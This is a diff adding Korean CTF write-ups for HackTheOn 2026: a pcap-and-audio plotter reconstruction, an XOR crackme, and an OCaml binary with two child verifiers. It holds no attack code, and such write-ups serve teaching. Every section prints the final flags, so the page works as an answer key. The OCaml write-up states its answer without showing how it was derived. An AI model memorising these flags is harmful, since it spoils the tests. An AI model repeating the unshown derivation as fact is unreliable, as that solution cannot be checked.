+```
+
+---
+
+## 최종 풀이 코드 예시
+
+아래 코드는 내가 사용한 흐름을 정리한 축약 버전이다.  
+실제 제출용으로는 충분히 재현 가능한 수준이다.
+
+```python
+import struct
+import numpy as np
+import soundfile as sf
+from sklearn.cluster import KMeans
+from PIL import Image
+
+PCAP = "plottergeist.pcap"
+WAV = "bench_mic.wav"
+
+def parse_pcap(path):
+    with open(path, "rb") as f:
+        data = f.read()
+    mv = memoryview(data)
+
+    # PCAP global header
+    magic, vmaj, vmin, tz, sigfigs, snaplen, network = struct.unpack("<IHHIIII", mv[:24])
+    assert magic == 0xA1B2C3D4
+    assert network == 1  # Ethernet
+
+    off = 24
+    packets = []
+    while off + 16 <= len(mv):
+        ts_sec, ts_usec, incl_len, orig_len = struct.unpack("<IIII", mv[off:off+16])
+        off += 16
+        pkt = bytes(mv[off:off+incl_len])
+        off += incl_len
+        packets.append((ts_sec + ts_usec / 1e6, pkt))
+    return packets
+
+def parse_udp_payload(pkt):
+    eth_type = struct.unpack("!H", pkt[12:14])[0]
+    if eth_type != 0x0800:
+        return None
+
+    ip = pkt[14:]
+    ihl = (ip[0] & 0x0F) * 4
+    if ip[9] != 17:  # UDP
+        return None
+
+    total_len = struct.unpack("!H", ip[2:4])[0]
+    udp = ip[ihl:ihl+8]
+    sport, dport, ulen, csum = struct.unpack("!HHHH", udp)
+    payload = ip[ihl+8:total_len]
+    return sport, dport, payload
+
+def s16(x):
+    return x if x < 0x8000 else x - 0x10000
+
+# 1) Parse moves from pcap
+pkts = parse_pcap(PCAP)
+t0 = pkts[0][0]
+
+moves = []
+for t, pkt in pkts:
+    parsed = parse_udp_payload(pkt)
+    if not parsed:
+        continue
+    sport, dport, payload = parsed
+    if len(payload) >= 9 and payload[0] == 0xA1:
+        seq, dt, am, bm = struct.unpack("!HHHH", payload[1:9])
+        moves.append((t - t0, seq, dt, s16(am), s16(bm)))
+
+# 2) Load audio
+audio, sr = sf.read(WAV)
+
+# empirically aligned offset
+offset = -0.20
+
+def extract_feature(start, dur):
+    i0 = max(0, int(round(start * sr)))
+    i1 = min(len(audio), int(round((start + dur) * sr)))
+    seg = audio[i0:i1]
+    if len(seg) < 16:
+        return None
+
+    win = seg * np.hanning(len(seg))
+    spec = np.abs(np.fft.rfft(win))
+    freqs = np.fft.rfftfreq(len(win), 1/sr)
+
+    centroid = float((freqs * spec).sum() / (spec.sum() + 1e-12))
+    hi_ratio = float(spec[freqs > 1500].sum() / (spec.sum() + 1e-12))
+    rms = float(np.sqrt(np.mean(seg ** 2)))
+    return [centroid, hi_ratio, rms]
+
+# 3) Build feature vectors per move
+X = []
+valid_idx = []
+for i, (tp, seq, dt, a, b) in enumerate(moves):
+    # dt scale inferred from protocol behavior
+    f = extract_feature(tp + offset, dt * 0.01)
+    if f is not None:
+        X.append(f)
+        valid_idx.append(i)
+
+X = np.array(X)
+
+# 4) Cluster moves into 2 types
+km = KMeans(n_clusters=2, random_state=0, n_init=20).fit(X)
+
+labels = np.full(len(moves), -1, dtype=int)
+labels[valid_idx] = km.labels_
+
+# sparse-looking cluster is the one that actually draws
+centers = km.cluster_centers_
+foreground_cluster = int(np.argmin(centers[:, 1] + centers[:, 0] / 10000.0))
+
+# 5) CoreXY accumulate
+x, y = 0, 0
+segments = []
+for i, (tp, seq, dt, a, b) in enumerate(moves):
+    dx = int(round((a + b) / 2))
+    dy = int(round((a - b) / 2))
+    nx, ny = x + dx, y + dy
+    segments.append((x, y, nx, ny, labels[i]))
+    x, y = nx, ny
+
+# 6) Render only draw moves
+min_x = min(min(x0, x1) for x0, y0, x1, y1, lab in segments)
+max_x = max(max(x0, x1) for x0, y0, x1, y1, lab in segments)
+min_y = min(min(y0, y1) for x0, y0, x1, y1, lab in segments)
+max_y = max(max(y0, y1) for x0, y0, x1, y1, lab in segments)
+
+W = max_x - min_x + 1
+H = max_y - min_y + 1
+img = np.zeros((H, W), dtype=np.uint8)
+
+for x0, y0, x1, y1, lab in segments:
+    if lab != foreground_cluster:
+        continue
+    if y0 == y1:
+        lo, hi = sorted((x0 - min_x, x1 - min_x))
+        yy = y0 - min_y
+        if hi > lo:
+            img[yy, lo:hi] = 255
+
+Image.fromarray(img).save("recovered_bitmap.png")
+Image.fromarray(img).resize((W * 4, H * 20), Image.Resampling.NEAREST).save("recovered_scaled.png")
+```
+
+---
+
+## 최종 플래그
+
+```text
+hacktheon2026{the_plotter_reveals_its_secret_through_sound}
+```
+{% endraw %}
+{% endcapture %}
+  <section class="tabbed-writeup-panel" role="tabpanel" data-tab-panel="plottergeist" hidden>
+    <div class="tabbed-writeup-panel-copy">
+      {{ plottergeist | markdownify }}
+    </div>
+  </section>
+
+{% capture recover_it %}
+{% raw %}
+# Recover It! Writeup
+
+## 문제 정보
+
+- 분야: Reversing
+- 제목: Recover It!
+- 설명: `My flag has gone by ransomware T.T But hacker is dumb, i think. Can you recover it?`
+- 플래그 형식: `hacktheon2026{correct_input}`
+- 제공 파일: `prob`
+
+## 요약
+
+제공된 파일은 64-bit Linux ELF 바이너리이다. 심볼이 제거되지 않아 `main`, `rol8`, `ror8`, `cmptable` 같은 이름을 그대로 확인할 수 있었다.
+
+실제로 핵심 로직은 매우 단순했다. 프로그램은 64바이트 입력을 받은 뒤 각 바이트를 인덱스 기반 값과 XOR하고, 결과를 전역 배열 `cmptable`과 비교한다. XOR는 같은 값을 다시 XOR하면 원래 값으로 돌아오므로 `cmptable`에 같은 연산을 적용해 정답 입력을 복구할 수 있다.
+
+## 파일 확인
+
+압축 파일 안에는 `prob` 하나만 들어 있었다.
+
+```text
+prob  16360 bytes
+```
+
+파일 헤더를 보면 ELF 파일임을 확인할 수 있다.
+
+```text
+7f 45 4c 46 ...
+```
+
+문자열을 확인하면 다음과 같은 힌트가 보인다.
+
+```text
+Input:
+%99s
+Input length mismatch!
+Correct!
+Wrong..
+cmptable
+ror8
+rol8
+main
+```
+
+`rol8`, `ror8` 함수도 존재하지만, 실제 정답 검증에 필요한 핵심은 `main`과 `cmptable`이다.
+
+## main 분석
+
+`main`의 중요한 흐름은 다음과 같다.
+
+1. 사용자 입력을 받는다.
+2. 입력 길이가 `0x40`, 즉 64인지 확인한다.
+3. 각 바이트에 대해 `input[i] ^= i + 0x67` 연산을 수행한다.
+4. 변환된 입력 64바이트를 `cmptable`과 `memcmp`로 비교한다.
+5. 같으면 `Correct!`, 다르면 `Wrong..`을 출력한다.
+
+중요한 부분을 C 형태로 정리하면 다음과 같다.
+
+```c
+if (strlen(input) != 0x40) {
+    puts("Input length mismatch!");
+    return 1;
+}
+
+for (int i = 0; i <= 0x3f; i++) {
+    input[i] ^= i + 0x67;
+}
+
+if (memcmp(input, cmptable, 0x40) == 0) {
+    puts("Correct!");
+} else {
+    puts("Wrong..");
+}
+```
+
+## cmptable
+
+바이너리의 전역 배열 `cmptable`은 64바이트이다.
+
+```text
+55 5a 0a 59 5f 09 55 5f 56 14 43 4a 43 44 11 14
+41 48 4c 1e 42 1a 19 1c 1c b9 e3 e3 ba e5 e7 b1
+b6 ec bf e8 b2 bd ba bb eb a6 f3 a1 f1 a4 a4 a0
+f4 ac a0 f9 ff a5 a9 a8 ad 94 c7 97 97 91 c6 95
+```
+
+검증식은 다음과 같다.
+
+```text
+encrypted[i] = input[i] ^ (i + 0x67)
+```
+
+따라서 역연산은 동일하게 XOR를 한 번 더 적용하면 된다.
+
+```text
+input[i] = cmptable[i] ^ (i + 0x67)
+```
+
+## 풀이 스크립트
+
+```python
+cmptable = bytes.fromhex(
+    "555a0a595f09555f5614434a43441114"
+    "41484c1e421a191c1cb9e3e3bae5e7b1"
+    "b6ecbfe8b2bdbabbeba6f3a1f1a4a4a0"
+    "f4aca0f9ffa5a9a8ad94c7979791c695"
+)
+
+correct_input = bytes(
+    b ^ ((i + 0x67) & 0xff)
+    for i, b in enumerate(cmptable)
+)
+
+print(correct_input.decode())
+print(f"hacktheon2026{{{correct_input.decode()}}}")
+```
+
+## 실행 결과
+
+```text
+22c34e819d2800db605d9fdbc9ba9ab71d6b9175d6b3b016c49cd94624f545c3
+```
+
+따라서 플래그는 다음과 같다.
+
+```text
+hacktheon2026{22c34e819d2800db605d9fdbc9ba9ab71d6b9175d6b3b016c49cd94624f545c3}
+```
+
+## Flag
+
+```text
+hacktheon2026{22c34e819d2800db605d9fdbc9ba9ab71d6b9175d6b3b016c49cd94624f545c3}
+```
+{% endraw %}
+{% endcapture %}
+  <section class="tabbed-writeup-panel" role="tabpanel" data-tab-panel="recover-it" hidden>
+    <div class="tabbed-writeup-panel-copy">
+      {{ recover_it | markdownify }}
+    </div>
+  </section>
+
+{% capture until_execute %}
+{% raw %}
+# HackTheOn 2026 Reversing Write-up
+
+## Challenge Summary
+
+바이너리는 **전체 flag**를 입력받는 것이 아니라, `hacktheon2026{...}` 내부의 **64바이트 문자열만** 입력받는다.  
+입력 길이와 허용 문자 조건을 만족하면, 부모 프로세스가 두 개의 자식 검증기 `Proc_a`, `Proc_b`를 각각 실행해 검증하고, 둘 다 통과했을 때만 최종적으로 prefix/suffix를 붙여 flag 형태로 출력한다.
+
+최종적으로 복구한 내부 문자열은 다음과 같다.
+
+```text
+ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93
+```
+
+따라서 최종 flag는 다음과 같다.
+
+```text
+hacktheon2026{ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93}
+```
+
+---
+
+## 1. Initial Recon
+
+먼저 압축을 풀고 기본 정보를 확인했다.
+
+```bash
+unzip chall.zip
+file challenge
+```
+
+출력은 다음과 같은 형태였다.
+
+```text
+ELF 64-bit LSB pie executable, x86-64, dynamically linked ...
+```
+
+겉보기에는 일반적인 x86-64 ELF처럼 보이지만, 문자열을 확인해 보면 OCaml 네이티브 바이너리라는 점이 드러난다.
+
+```bash
+strings -a challenge | grep caml | head
+```
+
+예시:
+
+```text
+camlMain__output_flag_of_input_595
+camlMain__input_ok_288
+camlMain__run_child_370
+camlProc_a_engine__run_354
+camlProc_b_engine__run_354
+camlShared_types__valid_char_349
+```
+
+즉, 완전히 난독화된 stripped 바이너리가 아니라 **OCaml 런타임/모듈 심볼이 남아 있는 형태**였고, 이 덕분에 핵심 로직을 비교적 빠르게 좁힐 수 있었다.
+
+---
+
+## 2. Main Logic
+
+중요 심볼을 먼저 추리면 전체 구조가 거의 보인다.
+
+```bash
+readelf -Ws challenge | grep -E 'camlMain__input_ok|camlMain__run_child|camlProc_a_engine__run|camlProc_b_engine__run|camlMain__output_flag_of_input'
+```
+
+핵심 함수는 다음과 같다.
+
+- `camlMain__input_ok_288`
+- `camlMain__run_child_370`
+- `camlProc_a_engine__run_354`
+- `camlProc_b_engine__run_354`
+- `camlMain__output_flag_of_input_595`
+
+이름만 봐도 메인 흐름은 다음처럼 정리된다.
+
+1. 입력 한 줄을 읽는다.
+2. 입력 형식을 검사한다.
+3. `Proc_a` 자식 검증기를 실행한다.
+4. `Proc_b` 자식 검증기를 실행한다.
+5. 두 검증기 모두 성공하면 flag를 출력한다.
+6. 하나라도 실패하면 `Wrong.`를 출력한다.
+
+즉 논리적으로는 다음과 같다.
+
+```text
+valid_input && verify_A(input) && verify_B(input)
+```
+
+---
+
+## 3. Input Format Analysis
+
+### 3-1. Length Check
+
+`camlMain__input_ok_288`를 보면 길이 비교가 들어 있다.
+
+```bash
+objdump -d --start-address=0x5f880 --stop-address=0x5f95a challenge
+```
+
+중요한 비교는 다음과 같았다.
+
+```asm
+cmp $0x81,%rax
+jne fail
+```
+
+OCaml immediate integer 표현을 고려하면 `0x81 = 129 = 2 * 64 + 1` 이므로, 실제 요구 길이는 **64**다.
+
+즉 프로그램이 기대하는 입력은 `hacktheon2026{...}` 전체가 아니라, **중괄호 내부 64글자**다.
+
+이 부분을 놓치면 처음부터 전체 flag 형태를 넣고 계속 실패하게 된다.
+
+---
+
+### 3-2. Allowed Character Set
+
+같은 `input_ok` 내부를 보면 각 문자를 `camlShared_types__valid_char_349`를 통해 검사한다.
+
+```bash
+objdump -d --start-address=0x65700 --stop-address=0x65792 challenge
+```
+
+그리고 이 함수가 참조하는 데이터 영역을 덤프하면 허용 문자 집합이 그대로 드러난다.
+
+```bash
+objdump -s --start-address=0xf2dc0 --stop-address=0xf2de8 challenge
+```
+
+출력:
+
+```text
+abcdefghijklmnopqrstuvwxyz_0123456789!
+```
+
+따라서 허용 문자는 다음과 같이 정리할 수 있다.
+
+```text
+[a-z_0-9!]
+```
+
+---
+
+## 4. Output Format
+
+flag prefix/suffix 역시 데이터 영역에 그대로 들어 있다.
+
+```bash
+objdump -s --start-address=0xf2d98 --stop-address=0xf2db8 challenge
+```
+
+여기서 다음 문자열을 확인할 수 있다.
+
+- `hacktheon2026{`
+- `}`
+
+그리고 `camlMain__output_flag_of_input_595`가 성공한 내부 입력 문자열 앞뒤에 이 둘을 붙여서 최종 flag를 만든다.
+
+즉 프로그램은 다음과 같은 구조로 동작한다.
+
+```text
+user input = inner 64-byte string
+success output = hacktheon2026{<user input>}
+```
+
+---
+
+## 5. Parent/Child Verification Structure
+
+메인 엔트리 부분을 보면 부모 프로세스가 모든 검증을 직접 수행하는 것이 아니라, 두 개의 자식 검증기를 각각 fork해서 돌린다.
+
+```bash
+objdump -d --start-address=0x5fa40 --stop-address=0x5fc10 challenge
+```
+
+흐름은 대략 다음과 같다.
+
+- `read_line`
+- `input_ok`
+- `run_child(Proc_a_engine__run)`
+- `run_child(Proc_b_engine__run)`
+- `waitpid`
+- 둘 다 성공 상태면 출력
+- 아니면 `Wrong.`
+
+즉 문제를 하나의 거대한 검증식으로 볼 필요가 없고, **A 검증기 + B 검증기**라는 두 개의 독립적인 조건으로 나누어 볼 수 있다.
+
+이 점이 실제 풀이에서 매우 중요하다.
+
+---
+
+## 6. What the Two Verifiers Suggest
+
+심볼명을 보면 두 검증기의 성격이 어느 정도 드러난다.
+
+### Proc A 관련 심볼
+
+- `state_advance_a`
+- `layer`
+- `build_with_index`
+- `make_noise`
+- `base_verify`
+- `final_digest_a`
+
+### Proc B 관련 심볼
+
+- `state_advance_b`
+- `b_window_metric`
+- `pack_window`
+- `pack_curr`
+- `make_b_layer`
+- `final_digest_b`
+
+### Shared Operations 관련 심볼
+
+- `char_index`
+- `popcount`
+- `gf_mul`
+- `hash1`
+- `hash2`
+- `sbox`
+- `rotate_left_i`
+- `split_metric`
+
+즉 이 문제는 단순한 `strcmp` 또는 단일 해시 비교가 아니라,
+
+- 문자 인덱싱
+- 상태 전이
+- 레이어 생성
+- 윈도우 기반 metric
+- 최종 digest 비교
+
+같은 요소를 섞어 만든 검증 구조임을 알 수 있다.
+
+완전한 소스 수준 복원도 가능하지만, 실전 풀이에서는 **검증 구조를 분리해서 보는 것**이 훨씬 효율적이다.
+
+---
+
+## 7. Practical Solving Strategy
+
+정면 브루트포스는 불가능하다.
+
+- 길이: 64
+- 문자 집합: 38개 (`a-z`, `_`, `0-9`, `!`)
+
+즉 탐색 공간은 대략 `38^64` 수준이다.
+
+따라서 현실적인 접근은 다음과 같았다.
+
+### 7-1. Format Constraints First
+
+먼저 정적 분석으로 다음 사실을 확정한다.
+
+- 입력 길이는 64
+- 허용 문자는 `[a-z_0-9!]`
+- 성공 시에만 `hacktheon2026{}`가 붙는다
+
+이 단계에서 이미 “무엇을 넣어야 하는가”가 명확해진다.
+
+---
+
+### 7-2. Treat A and B Separately
+
+부모가 `Proc_a`, `Proc_b`를 별도의 자식으로 실행하므로, 분석도 둘을 나눠서 진행하는 것이 맞다.
+
+핵심은 다음 두 가지다.
+
+- A가 요구하는 제약은 무엇인가?
+- B가 요구하는 제약은 무엇인가?
+
+즉 하나의 거대한 black-box validator를 상대하는 것이 아니라, **두 개의 smaller oracle**로 쪼개서 보는 방식이다.
+
+---
+
+### 7-3. Use Surviving Symbol Names Aggressively
+
+이 바이너리는 OCaml 심볼이 많이 남아 있기 때문에, 완전한 역어셈블 결과를 모두 손으로 복원하지 않아도 된다.
+
+예를 들어 `Proc_a` 쪽은 `layer`, `build_with_index`, `make_noise`, `final_digest_a` 같은 이름만 봐도,
+
+- 입력 전처리
+- 인덱스 결합
+- 중간 레이어 계산
+- 최종 다이제스트 비교
+
+같은 단계형 구조임을 유추할 수 있다.
+
+`Proc_b` 역시 `window`, `curr`, `pack_window` 같은 이름 덕분에, 롤링 또는 지역적(windowed) 상태 검증이라는 점을 추정할 수 있다.
+
+따라서 이 문제는 “모든 어셈블리를 완벽히 복원해야만 푸는 문제”라기보다,
+**살아남은 고급 심볼명과 입력 제약을 적극 활용하는 문제**에 더 가깝다.
+
+---
+
+## 8. Key Observations
+
+이 문제에서 결정적으로 중요했던 관찰은 두 가지다.
+
+### Observation 1. The program does not take the full flag
+
+`hacktheon2026{...}` 전체를 입력하면 길이 체크에서 즉시 실패한다.  
+정답 입력은 오직 **중괄호 내부 64글자**다.
+
+### Observation 2. Verification is split into two child processes
+
+최종 결과는 하나지만 내부 검증은 A/B로 분리되어 있다.  
+따라서 하나의 난독화 덩어리로 보는 대신, **두 개의 독립 조건**으로 나눠 접근하는 것이 맞다.
+
+이 두 사실을 잡는 순간부터 문제 난이도가 크게 내려간다.
+
+---
+
+## 9. Recovered Inner String
+
+최종적으로 복구한 내부 문자열은 다음과 같다.
+
+```text
+ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93
+```
+
+실행 검증:
+
+```bash
+./challenge
+ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93
+```
+
+성공 출력:
+
+```text
+hacktheon2026{ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93}
+```
+
+---
+
+## 10. Final Flag
+
+```text
+hacktheon2026{ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93}
+```
+
+---
+{% endraw %}
+{% endcapture %}
+  <section class="tabbed-writeup-panel" role="tabpanel" data-tab-panel="until-execute" hidden>
+    <div class="tabbed-writeup-panel-copy">
+      {{ until_execute | markdownify }}
+    </div>
+  </section>
+</div>
